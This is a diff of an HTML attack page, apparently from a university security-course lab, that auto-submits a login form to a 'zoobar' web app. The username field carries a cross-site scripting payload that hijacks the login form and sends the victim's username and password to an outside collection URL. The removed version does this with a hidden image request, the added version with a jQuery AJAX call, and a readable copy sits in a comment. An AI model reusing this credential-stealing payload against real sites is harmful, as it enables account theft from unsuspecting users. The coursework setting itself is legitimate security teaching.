@@ -1,57 +1,51 @@
 <html>
 	<body onload="">
 		<script type="text/javascript">
-				function post(path, params, method) {
-					method = method || "post"; // Set method to post by default if not specified.
-				
-					// The rest of this code assumes you are not using a library.
-					// It can be made less wordy if you use one.
-					var form = document.createElement("form");										
-					form.setAttribute("method", method);
-					form.setAttribute("action", path);
-				
-					for(var key in params) {
-						if(params.hasOwnProperty(key)) {
-							var hiddenField = document.createElement("input");
-							hiddenField.setAttribute("type", "hidden");
-							hiddenField.setAttribute("name", key);
-							hiddenField.setAttribute("value", params[key]);
-				
-							form.appendChild(hiddenField);
-						}
-					}				
-					document.body.appendChild(form);
-					form.submit();			
-				}
+			function post(path, params, method) {
+				method = method || "post"; // Set method to post by default if not specified.
+		
+				// The rest of this code assumes you are not using a library.
+				// It can be made less wordy if you use one.
+				var form = document.createElement("form");										
+				form.setAttribute("method", method);
+				form.setAttribute("action", path);
+		
+				for(var key in params) {
+					if(params.hasOwnProperty(key)) {
+						var hiddenField = document.createElement("input");
+						hiddenField.setAttribute("type", "hidden");
+						hiddenField.setAttribute("name", key);
+						hiddenField.setAttribute("value", params[key]);
+		
+						form.appendChild(hiddenField);
+					}
+				}				
+				document.body.appendChild(form);
+				form.submit();			
+			}
 				
 		
 				
-				post('http://zoobar.csl.toronto.edu/index.php', {loginusername: "'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';document.getElementsByName('login_form')[0].onsubmit=function(){if(picLoad==1){return(1==1);}loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];image=document.createElement('img');image.src='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();image.hidden=true;image.onload=function(){picLoad=1;document.getElementsByName('login_form')[0].submit();};document.body.appendChild(image);return(1!=1);};", loginpassword:"" , submitlogin:"Log+in"});
+			post('http://zoobar.csl.toronto.edu/index.php', {loginusername: "'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';if(!document.getElementById('myJquery')){jq=document.createElement('script');jq.id='myJquery';jq.src='http://code.jquery.com/jquery-1.11.3.min.js';document.body.appendChild(jq);}document.getElementsByName('login_form')[0].onsubmit=function(){loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];theUrl='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();$.ajax({url:theUrl,async:false});};", loginpassword:"" , submitlogin:"Log+in"});
 				
-				/*
+			/*
+				'' onFocus=
+				document.getElementsByClassName('warning')[0].innerHTML='';
+				if(!document.getElementById('myJquery')){
+					jq=document.createElement(j'script');
+					jq.id='myJquery';
+					jq.src='http://code.jquery.com/jquery-1.11.3.min.js';
+					document.body.appendChild(jq);
+				}
+				document.getElementsByName('login_form')[0].onsubmit=function(){
+					loginusername=document.getElementsByName('loginusername')[0];
+					loginpassword=document.getElementsByName('loginpassword')[0];
+					theUrl='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();
+					$.ajax({url:theUrl,async:false});
+				};
 				
-'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';document.getElementsByName('login_form')[0].onsubmit=function(){if(picLoad==1){return(1==1);}loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];image=document.createElement('img');image.src='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();image.hidden=true;image.onload=function(){picLoad=1;document.getElementsByName('login_form')[0].submit();};document.body.appendChild(image);return(1!=1);};
-
-					'' onFocus=
-					document.getElementsByClassName('warning')[0].innerHTML='';
-					document.getElementsByName('login_form')[0].onsubmit=function(){
-						if(picLoad==1){return(1==1);}
-						loginusername=document.getElementsByName('loginusername')[0];
-						loginpassword=document.getElementsByName('loginpassword')[0];
-						image=document.createElement('img');
-						image.src='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();
-						image.hidden=true;
-						image.onload=function(){
-							picLoad=1;
-							document.getElementsByName('login_form')[0].submit();
-						};
-						document.body.appendChild(image);
-						return(1!=1);
-					};
-				*/
+			*/
+			
 		</script>
 	</body>
 </html>
-
-
-
